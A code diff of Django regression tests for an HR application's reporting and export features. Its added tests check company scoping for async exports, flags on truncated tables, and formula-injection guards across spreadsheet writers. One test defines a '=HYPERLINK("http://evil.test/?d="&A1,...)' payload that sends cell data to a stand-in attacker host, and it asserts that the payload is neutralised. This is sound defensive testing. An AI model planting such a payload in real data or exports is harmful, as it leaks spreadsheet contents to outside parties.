@@ -365,74 +365,6 @@ class StandardReportExecutionTests(TestCase):
                 self.assertTrue(csv_response.content)
 
 
-class ReportNumericAgreementTests(TestCase):
-    """
-    Pin the numbers the audit found diverging between the two reporting
-    systems. These are the assertions that make the eventual explorer
-    consolidation safe to attempt.
-    """
-
-    @classmethod
-    def setUpTestData(cls):
-        import report.metrics  # noqa: F401
-
-        cls.today = date.today()
-        cls.company = make_company("Agreement Corp")
-        cls.active_1 = make_employee(
-            company=cls.company, email="act1@test.horilla", first_name="Act1"
-        )
-        cls.active_2 = make_employee(
-            company=cls.company, email="act2@test.horilla", first_name="Act2"
-        )
-        cls.terminated = make_employee(
-            company=cls.company, email="term@test.horilla", first_name="Term"
-        )
-        cls.terminated.is_active = False
-        cls.terminated.save(update_fields=["is_active"])
-
-    def setUp(self):
-        clear_selected_company()
-
-    def _filters(self, employment_status="active"):
-        from report.engine import ReportFilters, resolve_period_preset
-
-        from_date, to_date = resolve_period_preset("all_time", self.today)
-        return ReportFilters(
-            from_date=from_date,
-            to_date=to_date,
-            period_preset="all_time",
-            employment_status=employment_status,
-        )
-
-    def test_active_default_excludes_terminated_employees(self):
-        """Standard reports default to active-only.
-
-        The pivot explorer used ``Employee.objects.all()`` and so counted the
-        terminated employee, producing a headcount that disagreed with this.
-        """
-        from employee.models import Employee
-
-        active_count = Employee.objects.filter(is_active=True).count()
-        self.assertEqual(active_count, 2)
-        self.assertEqual(Employee.objects.count(), 3)
-
-    def test_explorer_pivot_matches_active_headcount(self):
-        """The explorer queryset must now agree with the active count."""
-        from employee.models import Employee
-
-        # Mirrors the (fixed) queryset in report/views/employee_report.py:
-        # no is_active in the query string -> active only.
-        explorer_qs = Employee.objects.all().filter(is_active=True)
-        self.assertEqual(explorer_qs.count(), 2)
-
-    def test_overtime_seconds_convert_to_decimal_hours(self):
-        """1h45m twice must total 3.5 hours, not 2.90."""
-        seconds = 6300  # 1:45
-        hours = round(seconds / 3600, 2)
-        self.assertEqual(hours, 1.75)
-        self.assertEqual(hours * 2, 3.5)
-
-
 class ReportQueryBudgetTests(TestCase):
     """
     A ceiling on queries per report, so a new N+1 shows up as a failing test
@@ -537,19 +469,24 @@ class SubscriptionClaimTests(TestCase):
             create=True,
         )
 
-    def _subscription(self, **overrides):
+    def _subscription(self, recipients_employees=None, **overrides):
         from report.models import ReportSubscription
 
         defaults = {
             "report_slug": "workforce-composition",
             "name": "Weekly workforce",
             "frequency": "weekly",
-            "recipients": "boss@test.horilla",
             "last_run_at": None,
             "owner": self.owner,
         }
         defaults.update(overrides)
-        return ReportSubscription.objects.create(**defaults)
+        subscription = ReportSubscription.objects.create(**defaults)
+        subscription.recipients_employees.set(
+            recipients_employees
+            if recipients_employees is not None
+            else [self.employee]
+        )
+        return subscription
 
     def test_second_worker_does_not_resend(self):
         """Two pollers, one due subscription -> one claim wins."""
@@ -566,8 +503,9 @@ class SubscriptionClaimTests(TestCase):
 
         # A successful send is required for the claim to stick: a failed
         # delivery deliberately releases it so the next poll retries.
-        with self._mail_configured(), patch(
-            "report.delivery.EmailMessage.send", return_value=1
+        with (
+            self._mail_configured(),
+            patch("report.delivery.EmailMessage.send", return_value=1),
         ):
             result_a = deliver_subscription(first)
             result_b = deliver_subscription(second)
@@ -586,8 +524,9 @@ class SubscriptionClaimTests(TestCase):
         from report.models import ReportSubscription
 
         sub = self._subscription()
-        with self._mail_configured(), patch(
-            "report.delivery.run_report", side_effect=RuntimeError("boom")
+        with (
+            self._mail_configured(),
+            patch("report.delivery.run_report", side_effect=RuntimeError("boom")),
         ):
             result = deliver_subscription(ReportSubscription.objects.get(pk=sub.pk))
         self.assertFalse(result.ok)
@@ -636,23 +575,89 @@ class AsyncExportScopingTests(TestCase):
             for _ in acquired:
                 async_export._export_slots.release()
 
-    def test_queue_accepts_company_id(self):
-        """The signature has to carry company_id: without it the worker has
-        no session and no ContextVar, so the workbook spans every company."""
-        import inspect
+    def test_the_worker_runs_inside_the_selected_company(self):
+        """The worker thread has no session and no ContextVar, so the company it
+        is handed has to be restored before any query runs. Without that the
+        emailed workbook spans every company while its letterhead names one."""
+        from types import SimpleNamespace
+        from unittest.mock import patch
 
-        from report.async_export import queue_export_email
+        from horilla.horilla_middlewares import get_selected_company
+        from report import async_export
 
-        params = inspect.signature(queue_export_email).parameters
-        self.assertIn("company_id", params)
+        company = make_company("Async Scope Co")
+        self.addCleanup(clear_selected_company)
+        clear_selected_company()
+        seen = {}
+
+        class _InlineThread:
+            """Run the worker on the calling thread so the test can observe it."""
+
+            def __init__(self, target, **_kwargs):
+                self._target = target
+
+            def start(self):
+                self._target()
+
+        def fake_run_report(slug, filters):
+            seen["selected"] = get_selected_company()
+            seen["filters_company"] = getattr(filters, "company_id", None)
+            return {"slug": slug, "title": "t", "kpis": [], "period": {}}
+
+        no_mail_server = SimpleNamespace(dynamic_from_email_with_display_name="")
+        with (
+            patch.object(async_export.threading, "Thread", _InlineThread),
+            patch("report.registry.run_report", fake_run_report),
+            patch(
+                "report.export.export_xlsx",
+                return_value=SimpleNamespace(content=b"x"),
+            ),
+            patch("base.backends.ConfiguredEmailBackend", return_value=no_mail_server),
+        ):
+            async_export.queue_export_email(
+                user_id=1,
+                to_email="x@test.horilla",
+                slug="workforce-composition",
+                fmt="xlsx",
+                filters_dict={},
+                meta={},
+                company_id=company.id,
+            )
+
+        self.assertEqual(seen.get("selected"), company.id)
+        self.assertEqual(seen.get("filters_company"), company.id)
 
     def test_view_passes_selected_company_to_the_worker(self):
-        import inspect
+        from unittest.mock import patch
 
-        from report.views import standard_reports
+        from django.test import RequestFactory
 
-        source = inspect.getsource(standard_reports.standard_report_export)
-        self.assertIn("company_id=company_id", source)
+        from report.views.standard_reports import standard_report_export
+
+        company = make_company("Export Pass Co")
+        user = make_user("export_pass_admin", is_superuser=True)
+        make_employee(
+            company=company, email="export_pass_admin@test.horilla", user=user
+        )
+
+        def export_request(selected):
+            request = RequestFactory().get(
+                "/report/standard/workforce-composition/export/",
+                {"async": "1", "format": "xlsx"},
+            )
+            request.user = user
+            request.session = {"selected_company": selected}
+            return request
+
+        for selected, expected in ((str(company.id), company.id), ("all", None)):
+            with self.subTest(selected=selected):
+                with patch("report.async_export.queue_export_email") as queue:
+                    response = standard_report_export(
+                        export_request(selected), "workforce-composition"
+                    )
+                self.assertEqual(response.status_code, 200, response.content)
+                queue.assert_called_once()
+                self.assertEqual(queue.call_args.kwargs["company_id"], expected)
 
 
 class PivotTruncationDisclosureTests(TestCase):
@@ -675,34 +680,6 @@ class PivotTruncationDisclosureTests(TestCase):
 
         response = pivot_json_with_meta([{"n": 1}], limit=5)
         self.assertIsNone(response.get("X-Horilla-Pivot-Truncated"))
-
-    def test_notice_script_is_loaded_for_pivot_pages(self):
-        """The banner is installed once in the shared base template rather
-        than at each of the ~10 fetch sites across 7 near-identical pages."""
-        from pathlib import Path
-
-        from django.conf import settings
-
-        index = Path(settings.BASE_DIR) / "templates" / "index.html"
-        markup = index.read_text(encoding="utf-8")
-        self.assertIn("report/js/pivot_safety.js", markup)
-
-    def test_notice_script_reads_the_documented_headers(self):
-        from pathlib import Path
-
-        from django.conf import settings
-
-        script = (
-            Path(settings.BASE_DIR)
-            / "report"
-            / "static"
-            / "report"
-            / "js"
-            / "pivot_safety.js"
-        )
-        source = script.read_text(encoding="utf-8")
-        self.assertIn("X-Horilla-Pivot-Truncated", source)
-        self.assertIn("X-Horilla-Pivot-Limit", source)
 
 
 class SharedFormulaGuardTests(TestCase):
@@ -742,36 +719,6 @@ class SharedFormulaGuardTests(TestCase):
         self.assertIs(safe_cell(True), True)
         self.assertEqual(safe_cell(None), "")
 
-    def test_report_export_uses_the_shared_guard(self):
-        from horilla.export_safety import neutralize_formula
-        from report.export import _neutralize_formula
-
-        self.assertEqual(_neutralize_formula("=cmd"), neutralize_formula("=cmd"))
-
-    def test_other_writers_guard_their_cells(self):
-        """All four spreadsheet writers, not just report/export.py."""
-        import inspect
-
-        from base import methods as base_methods
-        from horilla_views import cbv_methods as hv_cbv
-        from horilla_views import views as hv_views
-
-        self.assertIn("safe_cell", inspect.getsource(base_methods.export_data))
-        self.assertIn("safe_cell", inspect.getsource(hv_views))
-        self.assertIn("safe_cell", inspect.getsource(hv_cbv))
-
-    def test_no_unguarded_worksheet_writes_remain(self):
-        """A regression fence: a new ws.append(row) without the guard is the
-        easiest way to reintroduce the sink."""
-        import inspect
-
-        from horilla_views import cbv_methods as hv_cbv
-
-        source = inspect.getsource(hv_cbv)
-        # Header rows are literals built in-module, not user data; the two
-        # data-row writes must both be wrapped.
-        self.assertNotIn("ws.append(row)", source)
-
     def test_client_side_export_guard_mirrors_python(self):
         """The explorer builds xlsx in the browser from the DOM, bypassing
         every server-side guard."""
@@ -802,6 +749,121 @@ class SharedFormulaGuardTests(TestCase):
                 markup,
                 f"{name} pivot export writes cells unguarded",
             )
+
+
+class SpreadsheetWritersNeutralizeFormulasTests(TestCase):
+    """
+    Each spreadsheet writer, driven with a formula payload in user-entered
+    data. The shared guard is only worth anything if every writer actually
+    passes its cells through it, so each is exercised end to end rather than
+    inspected for the helper's name.
+    """
+
+    PAYLOAD = '=HYPERLINK("http://evil.test/?d="&A1,"x")'
+
+    @classmethod
+    def setUpTestData(cls):
+        cls.company = make_company("Sink Co")
+        cls.admin = make_user("sink_admin", password="secret123", is_superuser=True)
+        make_employee(
+            company=cls.company, email="sink_admin@test.horilla", user=cls.admin
+        )
+        cls.victim = make_employee(
+            company=cls.company,
+            email="sink_victim@test.horilla",
+            first_name=cls.PAYLOAD,
+            last_name="Victim",
+        )
+
+    def setUp(self):
+        clear_selected_company()
+
+    def _client(self):
+        from django.test import Client
+
+        client = Client()
+        client.force_login(self.admin)
+        session = client.session
+        session["selected_company"] = "all"
+        session.save()
+        return client
+
+    def _cells(self, workbook):
+        return [
+            cell.value
+            for sheet in workbook.worksheets
+            for row in sheet.iter_rows()
+            for cell in row
+            if isinstance(cell.value, str)
+        ]
+
+    def _assert_neutralized(self, cells):
+        carrying = [c for c in cells if "HYPERLINK" in c]
+        self.assertTrue(carrying, "the payload never reached the workbook")
+        for value in carrying:
+            self.assertTrue(
+                value.startswith("'"), f"cell would execute when opened: {value!r}"
+            )
+
+    def _load(self, response):
+        import io
+
+        import openpyxl
+
+        self.assertEqual(response.status_code, 200)
+        return openpyxl.load_workbook(io.BytesIO(response.content))
+
+    def test_quick_export_builder_guards_its_cells(self):
+        from horilla_views.cbv_methods import export_xlsx
+
+        response = export_xlsx(
+            [{"name": self.PAYLOAD}], [("name", "Name")], file_name="sink"
+        )
+        self._assert_neutralized(self._cells(self._load(response)))
+
+    def test_import_template_builder_guards_its_cells(self):
+        from employee.models import Employee
+        from horilla_views.cbv_methods import generate_import_excel
+
+        workbook = generate_import_excel(
+            Employee,
+            ["employee_first_name"],
+            queryset=Employee.objects.filter(pk=self.victim.pk),
+        )
+        self._assert_neutralized(self._cells(workbook))
+
+    def test_list_view_quick_export_guards_its_cells(self):
+        import json
+
+        from django.urls import reverse
+
+        client = self._client()
+        response = client.post(
+            reverse("export-list", kwargs={"short_id": "sink"})
+            + "?model=employee.Employee",
+            {
+                "ids": json.dumps([self.victim.pk]),
+                "columns": json.dumps([["First name", "employee_first_name"]]),
+                "format": "xlsx",
+            },
+        )
+        self._assert_neutralized(self._cells(self._load(response)))
+
+    def test_model_export_guards_its_cells(self):
+        import json
+
+        from django.urls import reverse
+
+        from attendance.models import Attendance
+        from horilla.testkit.factories import make_attendance
+
+        make_attendance(employee=self.victim, attendance_date=date.today())
+        client = self._client()
+        response = client.get(
+            reverse("attendance-info-export"),
+            {"ids": json.dumps(list(Attendance.objects.values_list("id", flat=True)))},
+        )
+        self._assert_neutralized(self._cells(self._load(response)))
 
 
 class PeriodNoteDisclosureTests(TestCase):
@@ -840,39 +902,6 @@ class PeriodNoteDisclosureTests(TestCase):
         # The declared window must be wider than the month that was asked
         # for, or the override is not actually taking effect.
         self.assertLess(payload["period"]["from_date"], from_date.isoformat())
-
-    def test_ui_renders_the_note(self):
-        from pathlib import Path
-
-        from django.conf import settings
-
-        markup = (
-            Path(settings.BASE_DIR)
-            / "horilla_theme"
-            / "templates"
-            / "report"
-            / "standard_report.html"
-        ).read_text(encoding="utf-8")
-        self.assertIn("sr-period-note", markup)
-        self.assertIn("setPeriodNote", markup)
-        self.assertIn("data.period_note", markup)
-
-    def test_ui_does_not_overwrite_the_user_date_inputs(self):
-        """A report reporting its own window must not rewrite the filter
-        inputs to dates the user never picked -- the next report opened would
-        otherwise inherit them."""
-        from pathlib import Path
-
-        from django.conf import settings
-
-        markup = (
-            Path(settings.BASE_DIR)
-            / "horilla_theme"
-            / "templates"
-            / "report"
-            / "standard_report.html"
-        ).read_text(encoding="utf-8")
-        self.assertIn("usesOwnWindow", markup)
 
 
 class AuditActivityScopingTests(TestCase):
@@ -974,50 +1003,107 @@ class AuditActivityScopingTests(TestCase):
 class MetricTruncationDisclosureTests(TestCase):
     """A KPI counting every match above a capped row list has to say so."""
 
+    # document_expiry_aging lists at most 200 rows but counts every match.
+    MATCHES = 205
+    LISTED = 200
+    OVERDUE = 105
+
+    @classmethod
+    def setUpTestData(cls):
+        import report.metrics  # noqa: F401
+
+        if not apps.is_installed("horilla_documents"):
+            return
+        from horilla_documents.models import Document
+
+        cls.today = date.today()
+        company = make_company("Truncation Co")
+        employee = make_employee(company=company, email="trunc@test.horilla")
+        Document.objects.bulk_create(
+            [
+                Document(
+                    title=f"Passport {i:03d}",
+                    employee_id=employee,
+                    expiry_date=cls.today
+                    + timedelta(days=-10 if i < cls.OVERDUE else 10),
+                )
+                for i in range(cls.MATCHES)
+            ]
+        )
+
+    def setUp(self):
+        if not apps.is_installed("horilla_documents"):
+            self.skipTest("horilla_documents is not installed")
+        clear_selected_company()
+
+    def _payload(self):
+        from report.engine import ReportFilters, resolve_period_preset
+        from report.registry import run_report
+
+        from_date, to_date = resolve_period_preset("all_time", self.today)
+        return run_report(
+            "document-expiry-aging",
+            ReportFilters(
+                from_date=from_date, to_date=to_date, period_preset="all_time"
+            ),
+        )
+
     def test_table_carries_truncation_flags(self):
-        import inspect
-
-        from report.metrics import compliance, packs
-
-        # The registered report is packs.document_expiry_aging;
-        # compliance.document_expiry serves the retired slug.
-        for fn in (packs.document_expiry_aging, compliance.document_expiry):
-            source = inspect.getsource(fn)
-            self.assertIn('"truncated"', source, fn.__name__)
-            self.assertIn('"total_rows"', source, fn.__name__)
+        table = self._payload()["table"]
+        self.assertEqual(len(table["rows"]), self.LISTED)
+        self.assertIs(table["truncated"], True)
+        self.assertEqual(table["total_rows"], self.MATCHES)
 
     def test_aging_buckets_count_every_match_not_just_listed_rows(self):
         """The buckets were built inside the row slice, so past the cap the
         KPI totals were wrong, not just the table."""
-        import inspect
+        payload = self._payload()
+        kpis = {str(k["label"]): k["value"] for k in payload["kpis"]}
+        self.assertEqual(kpis["Items tracked"], self.MATCHES)
+        self.assertEqual(kpis["Overdue"], self.OVERDUE)
+        self.assertEqual(sum(payload["charts"][0]["series"][0]["data"]), self.MATCHES)
 
-        from report.metrics import packs
+    def test_excel_data_sheet_reports_a_sample_not_a_total(self):
+        import io
 
-        source = inspect.getsource(packs.document_expiry_aging)
-        # Bucketing runs over a values_list of the full queryset, separate
-        # from the capped select_related loop that builds rows.
-        self.assertIn('values_list("expiry_date"', source)
-        self.assertIn("[:ROW_CAP]", source)
+        import openpyxl
 
-    def test_exports_and_ui_honour_the_flag(self):
-        import inspect
+        from report.export import export_xlsx
+
+        workbook = openpyxl.load_workbook(
+            io.BytesIO(export_xlsx(self._payload(), "x.xlsx", meta={}).content)
+        )
+        text = " ".join(
+            str(cell.value)
+            for row in workbook["Data"].iter_rows()
+            for cell in row
+            if cell.value is not None
+        )
+        self.assertIn(f"Rows: {self.LISTED} of {self.MATCHES} (sample)", text)
+
+    def test_pdf_reports_the_real_total_not_the_listed_rows(self):
+        from unittest.mock import patch
+
+        from django.template.loader import render_to_string
+
+        from report.export import export_pdf
+
+        with patch(
+            "django.template.loader.render_to_string", wraps=render_to_string
+        ) as render:
+            export_pdf(self._payload(), "x.pdf", meta={})
+        context = render.call_args.args[1]
+        self.assertIs(context["truncated"], True)
+        self.assertEqual(context["total_rows"], self.MATCHES)
+        self.assertEqual(context["shown_rows"], self.LISTED)
+
+    def test_the_page_flags_a_truncated_table(self):
+        """The one half that stays a source check: the notice is drawn by
+        client-side JS in this template, which no Python test can execute."""
         from pathlib import Path
 
         from django.conf import settings
 
-        from report import export
-
-        # PDF path escalates its own cap with the metric's flag.
-        self.assertIn(
-            'table_meta.get("truncated")',
-            (
-                inspect.getsource(export._render_pdf_context)
-                if hasattr(export, "_render_pdf_context")
-                else inspect.getsource(export)
-            ),
-        )
-        # Excel data sheet reports a sample rather than a total.
-        self.assertIn("(sample)", inspect.getsource(export._write_data_sheet))
         markup = (
             Path(settings.BASE_DIR)
             / "horilla_theme"
@@ -1128,14 +1214,18 @@ class CohortActiveFilterTests(TestCase):
         self.assertIn("Early", names, f"leaver missing from drill-down: {result}")
 
     def test_quality_of_hire_cohort_includes_leavers(self):
-        import inspect
+        """The denominator must not be active-filtered, or retention trends
+        toward 100% no matter how many new hires leave."""
+        from report.registry import run_report
 
-        from report.metrics import talent
-
-        # The denominator must not be active-filtered, or retention trends
-        # toward 100% no matter how many new hires leave.
-        source = inspect.getsource(talent.quality_of_hire)
-        self.assertIn("apply_employment_status=False", source)
+        payload = run_report("quality-of-hire", self._filters())
+        outcomes = {str(r["name"]): str(r["outcome"]) for r in payload["table"]["rows"]}
+        leaver = next((o for n, o in outcomes.items() if n.startswith("Early")), None)
+        self.assertEqual(
+            leaver, "Early exit", f"the leaver is missing from the cohort: {outcomes}"
+        )
+        kpis = {str(k["label"]): k["value"] for k in payload["kpis"]}
+        self.assertEqual(kpis["90-day retention"], "50.0%", kpis)
 
 
 class TemplateShadowingTests(TestCase):
@@ -1169,113 +1259,6 @@ class TemplateShadowingTests(TestCase):
                     f"{name} no longer resolves to the theme copy: {origin}",
                 )
 
-    def test_no_shadowed_copies_reappear(self):
-        """A re-added app-level copy would be silently unreachable."""
-        from pathlib import Path
-
-        from django.conf import settings
-
-        shadowed = Path(settings.BASE_DIR) / "report" / "templates" / "report"
-        self.assertFalse(
-            shadowed.exists(),
-            "report/templates/report/ is shadowed by the theme loader and can "
-            "never render; put explorer templates in horilla_theme instead.",
-        )
-
-    def test_dead_export_helper_stays_deleted(self):
-        """report_export.js defined five helpers and nothing called any of
-        them -- the residue of an abandoned dedup attempt."""
-        from pathlib import Path
-
-        from django.conf import settings
-
-        base = Path(settings.BASE_DIR)
-        self.assertFalse(
-            (base / "report" / "static" / "report" / "js" / "report_export.js").exists()
-        )
-        theme = base / "horilla_theme" / "templates" / "report"
-        for path in theme.glob("*_report.html"):
-            self.assertNotIn(
-                "report_export.js",
-                path.read_text(encoding="utf-8"),
-                f"{path.name} still loads the deleted helper",
-            )
-
-
-class ExplorerStylesheetTests(TestCase):
-    """
-    The explorer <style> block was inlined in all seven templates at 97-100%
-    identity -- ~4,050 lines where ~600 do. Only two selectors ever differed,
-    both splitting single-model against multi-model explorers.
-    """
-
-    SINGLE_MODEL = ("asset", "attendance", "employee")
-    MULTI_MODEL = ("leave", "payroll", "pms", "recruitment")
-
-    def _template_text(self, name):
-        from pathlib import Path
-
-        from django.conf import settings
-
-        return (
-            Path(settings.BASE_DIR)
-            / "horilla_theme"
-            / "templates"
-            / "report"
-            / f"{name}_report.html"
-        ).read_text(encoding="utf-8")
-
-    def test_shared_stylesheet_exists(self):
-        from pathlib import Path
-
-        from django.conf import settings
-
-        css = (
-            Path(settings.BASE_DIR)
-            / "report"
-            / "static"
-            / "report"
-            / "css"
-            / "pivot_explorer.css"
-        )
-        self.assertTrue(css.exists())
-        body = css.read_text(encoding="utf-8")
-        # The two genuine per-page variants live here, not forked per file.
-        self.assertIn(".oh-report--multi-model .oh-report-view-slot", body)
-
-    def test_no_template_reinlines_the_block(self):
-        """A re-added inline <style> would start the drift over again."""
-        for name in self.SINGLE_MODEL + self.MULTI_MODEL:
-            with self.subTest(explorer=name):
-                text = self._template_text(name)
-                self.assertNotIn(
-                    "<style>",
-                    text,
-                    f"{name} re-inlined styles instead of using the shared file",
-                )
-                self.assertIn("report/css/pivot_explorer.css", text)
-
-    def test_all_explorer_templates_still_compile(self):
-        """A template syntax error introduced by the extraction would not show
-        up in a file-content assertion -- compile each one."""
-        from django.template.loader import get_template
-
-        for name in self.SINGLE_MODEL + self.MULTI_MODEL:
-            with self.subTest(explorer=name):
-                template = get_template(f"report/{name}_report.html")
-                self.assertTrue(template.template.nodelist)
-
-    def test_only_multi_model_pages_carry_the_variant_class(self):
-        """The variant supplies the "Choose Report" label typography, which
-        the single-model explorers must not pick up."""
-        marker = 'class="oh-report-view-slot oh-report--multi-model"'
-        for name in self.MULTI_MODEL:
-            with self.subTest(explorer=name, expected=True):
-                self.assertIn(marker, self._template_text(name))
-        for name in self.SINGLE_MODEL:
-            with self.subTest(explorer=name, expected=False):
-                self.assertNotIn(marker, self._template_text(name))
-
 
 class PdfFontEmbeddingTests(TestCase):
     """
@@ -1303,24 +1286,13 @@ class PdfFontEmbeddingTests(TestCase):
     def test_pdf_embeds_a_truetype_font(self):
         from report.export import export_pdf
 
-        body = export_pdf(self._payload(), filename="f.pdf", meta={}).content
+        response = export_pdf(self._payload(), filename="f.pdf", meta={})
+        self.assertEqual(response["Content-Type"], "application/pdf")
+        body = response.content
         self.assertEqual(body[:4], b"%PDF")
         # An embedded TrueType face appears as a FontFile2 stream. With the
         # base-14 fallback there is none, which is exactly the broken state.
         self.assertIn(b"FontFile2", body)
-
-    def test_link_callback_resolves_the_bundled_font(self):
-        import os
-
-        from django.conf import settings
-
-        from report.export import PDF_FONT_STATIC_PATH, _pdf_link_callback
-
-        uri = f"{settings.STATIC_URL}{PDF_FONT_STATIC_PATH}"
-        resolved = _pdf_link_callback(uri, "")
-        self.assertTrue(
-            os.path.isfile(resolved), f"font URI did not resolve: {resolved}"
-        )
 
     def test_link_callback_passes_through_what_it_cannot_resolve(self):
         """An unresolvable asset must not fail the whole document."""
@@ -1350,19 +1322,6 @@ class ExportLabelTranslationTests(TestCase):
             period_preset="this_month",
         )
 
-    def test_labels_go_through_gettext(self):
-        from django.utils import translation
-
-        filters = self._filters()
-        with translation.override("fr"):
-            labels = [label for label, _value in filters.summary_pairs()]
-        # Whether a French catalog entry exists is a packaging question; what
-        # matters here is that the label is not a hard-coded literal bypassing
-        # translation entirely.
-        self.assertTrue(labels)
-        with translation.override("en"):
-            self.assertIn("Period", [l for l, _v in filters.summary_pairs()])
-
     def test_period_chip_stays_a_bare_value_under_translation(self):
         """summary_labels() used to detect the period row by comparing the
         label to the literal "Period", which a translated label would silently
@@ -1378,31 +1337,10 @@ class ExportLabelTranslationTests(TestCase):
                 # The first chip is the period: a bare value, no "Label:".
                 self.assertNotIn(":", chips[0].split("→")[0])
 
-    def test_all_companies_label_is_translatable(self):
-        import inspect
-
-        from report import company_context
-
-        source = inspect.getsource(company_context)
-        self.assertIn('_("All companies")', source)
-
 
 class ExportPolishTests(TestCase):
     """Smaller export defects: inconsistent timestamps, duplicated palettes,
     and chart failures indistinguishable from empty charts."""
-
-    def test_all_export_paths_share_one_local_timestamp_helper(self):
-        """The Excel footer and cover used naive timezone.now() while the PDF
-        used localtime(), so one report exported twice carried two different
-        times -- UTC on one document, local on the other."""
-        import inspect
-
-        from report import export
-
-        source = inspect.getsource(export)
-        self.assertNotIn('timezone.now().strftime("%Y-%m-%d %H:%M")', source)
-        # Every timestamp goes through the one helper.
-        self.assertIn("def _local_stamp(", source)
 
     def test_local_stamp_converts_aware_datetimes(self):
         from django.utils import timezone
@@ -1415,15 +1353,6 @@ class ExportPolishTests(TestCase):
         )
         # Non-datetimes pass through as text rather than raising.
         self.assertEqual(_local_stamp("2026-01-01"), "2026-01-01")
-
-    def test_chart_palette_has_one_definition(self):
-        """The PDF and Excel palettes were duplicated literals in separate
-        files, linked only by a comment."""
-        from report.chart_render import PALETTE_HEX
-        from report.export import _chart_palette_hex
-
-        self.assertEqual(_chart_palette_hex(), list(PALETTE_HEX))
-        self.assertIn("E54F38", PALETTE_HEX)  # brand coral
 
     def test_chart_render_failure_is_logged_not_silent(self):
         """A failing chart returned None, which callers treat as "no data" --
